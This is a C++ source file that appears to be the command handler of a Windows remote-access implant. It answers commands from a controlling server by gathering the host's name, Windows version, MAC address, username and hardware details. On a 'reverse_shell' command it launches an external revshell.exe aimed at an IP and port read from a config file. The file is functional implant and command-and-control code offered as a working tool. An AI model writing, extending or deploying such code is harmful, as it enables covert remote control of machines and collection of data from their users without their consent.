
#include "CommandProcessor.hpp"
#include "ConfigReader.hpp"
#include <iostream>
#include <sstream>
#include <iomanip>
#include <chrono>
#include <windows.h>
#include <iphlpapi.h>
#include <winnt.h>
#include <stdexcept>
#include <cstdlib>


#pragma comment(lib, "iphlpapi.lib")


namespace CommandProcessor 
{
    using json = nlohmann::json;

    std::string executeCommand(const std::string& command) {
        json commandJson, responseJson;
        std::string commandType;

        try 
        {
            commandJson = json::parse(command);
            commandType = commandJson.at("type").get<std::string>();
        } 
        catch (const std::exception&) 
        {
            return R"({"type": "error", "status": "invalid JSON or missing 'type' field"})";
        }

        auto executeCommandByType = [&]() -> json 
        {
            if (commandType == "ping") 
            {
                return {{"type", "ping"}, {"status", "pong"}};
            }

            if (commandType == "auth") 
            {
                if (commandJson.value("message", "") == "Authentication required") 
                {
                    std::cout << "Performing authentication" << std::endl;
                    return {
                        {"type", "auth"},
                        {"info", {
                            {"hostname", getHostName()},
                            {"os", "Windows"},
                            {"version", getWindowsVersion()},
                            {"version_number", getWindowsVersionNumber()},
                            {"mac_address", getMacAddress()}
                        }}
                    };
                }
                else if (commandJson.value("message", "") == "Authentication successful")
                {
                    std::cout << "Authentication successful" << std::endl;
                    return "";
                }

                return {{"type", "error"}, {"status", "invalid authentication message"}};
            }

            if (commandType == "system_info") 
            {
                try 
                {
                    std::cout << "Getting system info" << std::endl;
                    return {
                        {"type", "system_info"},
                        {"info", json::parse(getSystemInfoSummary())}
                    };
                } 
                catch (const std::exception&) 
                {
                    std::cout << "Failed to get system info" << std::endl;
                    return {{"type", "error"}, {"status", "failed to get system info"}};
                }
            }

            if (commandType == "reverse_shell") 
            {
                std::cout << "Starting reverse shell" << std::endl;
                ConfigReader configReader("config.json");
                std::string ip = configReader.getServerReverseShellIp();
                int port = configReader.getServerReverseShellPort();
                std::cout << "IP: " << ip << ", Port: " << port << std::endl;
                if (ip.empty() || port == -1)
                {
                    return {{"type", "error"}, {"status", "missing or invalid 'ip' or 'port'"}};
                }
                if (startReverseShell(ip, port)) 
                {
                    return {{"type", "reverse_shell"}, {"status", "reverse shell started"}};
                }
                return {{"type", "error"}, {"status", "failed to start reverse shell"}};
            }

            if (commandType == "echo") 
            {
                if (commandJson.contains("message") && commandJson["message"].is_string()) 
                {
                    return "";
                }
                return {{"type", "error"}, {"status", "missing or invalid 'message'"}};
            }

            if (commandType == "event") 
            {
                if (commandJson.contains("message") && commandJson["message"].is_string()) 
                {
                    return "";
                }
                return {{"type", "error"}, {"status", "missing or invalid 'message'"}};
            }
            return {{"type", "error"}, {"status", "unknown command"}};
        };

        responseJson = executeCommandByType();

        return responseJson.dump(4);
    }


    std::string getHostName() 
    {
        char hostname[256];
        DWORD size = sizeof(hostname);
        GetComputerNameA(hostname, &size);
        return std::string(hostname);
    }


    std::string getWindowsVersion() 
    {
        NTSTATUS(WINAPI * RtlGetVersion)(LPOSVERSIONINFOEXW) = nullptr;
        OSVERSIONINFOEXW osInfo = {0}; // Zero-initialize the structure

        // Explicitly set the size of the structure
        osInfo.dwOSVersionInfoSize = sizeof(osInfo);

        // Attempt to load the function from ntdll
        *(FARPROC*)&RtlGetVersion = GetProcAddress(GetModuleHandleA("ntdll"), "RtlGetVersion");

        if (RtlGetVersion != nullptr && RtlGetVersion(&osInfo) == 0) { // Check if function call was successful
            if (osInfo.dwMajorVersion == 10 && osInfo.dwMinorVersion == 0) {
                if (osInfo.dwBuildNumber >= 22000) {
                    return "11";
                }
                return "10";
            } else if (osInfo.dwMajorVersion == 6) {
                if (osInfo.dwMinorVersion == 3) return "8.1";
                if (osInfo.dwMinorVersion == 2) return "8";
                if (osInfo.dwMinorVersion == 1) return "7";
                if (osInfo.dwMinorVersion == 0) return "Vista";
            }
        }

        return "Unknown";
    }


    std::string getWindowsVersionNumber() 
    {
        NTSTATUS(WINAPI * RtlGetVersion)(LPOSVERSIONINFOEXW) = nullptr;
        OSVERSIONINFOEXW osInfo = {0}; // Zero-initialize the structure

        // Explicitly set the size of the structure
        osInfo.dwOSVersionInfoSize = sizeof(osInfo);

        // Attempt to load the function from ntdll
        *(FARPROC*)&RtlGetVersion = GetProcAddress(GetModuleHandleA("ntdll"), "RtlGetVersion");

        if (RtlGetVersion != nullptr && RtlGetVersion(&osInfo) == 0) { // Check if function call was successful
            // Create a string with major, minor, and build number
            return std::to_string(osInfo.dwMajorVersion) + "." +
                std::to_string(osInfo.dwMinorVersion) + "." +
                std::to_string(osInfo.dwBuildNumber);
        }

        return "Unknown";
    }


    std::string getMacAddress() 
    {
        IP_ADAPTER_INFO* adapterInfo = nullptr;
        ULONG bufferSize = 0;

        if (GetAdaptersInfo(adapterInfo, &bufferSize) == ERROR_BUFFER_OVERFLOW) {
            adapterInfo = (IP_ADAPTER_INFO*)malloc(bufferSize);
        }

        if (GetAdaptersInfo(adapterInfo, &bufferSize) == NO_ERROR) {
            char mac[18];
            snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
                adapterInfo->Address[0], adapterInfo->Address[1],
                adapterInfo->Address[2], adapterInfo->Address[3],
                adapterInfo->Address[4], adapterInfo->Address[5]);
            free(adapterInfo);
            return std::string(mac);
        }

        free(adapterInfo);
        return "Unknown";
    }


    std::string getSystemInfoSummary() 
    {
        nlohmann::json sysinfo;
        nlohmann::json system_info;

        // Get hostname
        sysinfo["hostname"] = getHostName();

        // Get operating system information
        sysinfo["os"] = "Windows";
        sysinfo["version"] = getWindowsVersion();
        sysinfo["version_number"] = getWindowsVersionNumber();

        // Get current timestamp
        auto now = std::chrono::system_clock::now();
        auto now_c = std::chrono::system_clock::to_time_t(now);
        std::tm local_tm;
        localtime_s(&local_tm, &now_c);
        std::stringstream ss;
        ss << std::put_time(&local_tm, "%Y-%m-%d %H:%M:%S");
        sysinfo["timestamp"] = ss.str();

        // Get CPU information
        SYSTEM_INFO sysInfo;
        GetNativeSystemInfo(&sysInfo);
        sysinfo["cpu_cores"] = sysInfo.dwNumberOfProcessors;

        // Get memory information
        MEMORYSTATUSEX memInfo;
        memInfo.dwLength = sizeof(MEMORYSTATUSEX);
        GlobalMemoryStatusEx(&memInfo);
        sysinfo["total_memory"] = static_cast<float>(memInfo.ullTotalPhys / (1024 * 1024 * 1024));
        sysinfo["available_memory"] = static_cast<float>(memInfo.ullAvailPhys / (1024 * 1024 * 1024));

        // Get system architecture
        sysinfo["architecture"] = "x64";

        // Get MAC address
        sysinfo["mac_address"] = getMacAddress();

        // Get username
        char username[UNLEN + 1];
        DWORD username_len = UNLEN + 1;
        GetUserNameA(username, &username_len);
        sysinfo["username"] = username;

        system_info["system_info"] = sysinfo;

        // Return JSON dump
        return system_info.dump(4);
    }


    bool startReverseShell(const std::string& ip, const int port)
    {
        // Create a reverse shell connection to the specified IP and port
        // For demonstration purposes, we will just print the IP and port
        std::cout << "Starting reverse shell to " << ip << ":" << port << std::endl;
        std::string command = "D:\\MyProject\\revshell\\x64\\Debug\\revshell.exe " + ip + " " + std::to_string(port);
        int result = system(command.c_str());
        std::cout << "Reverse shell started" << std::endl;
        return true;
    }

}






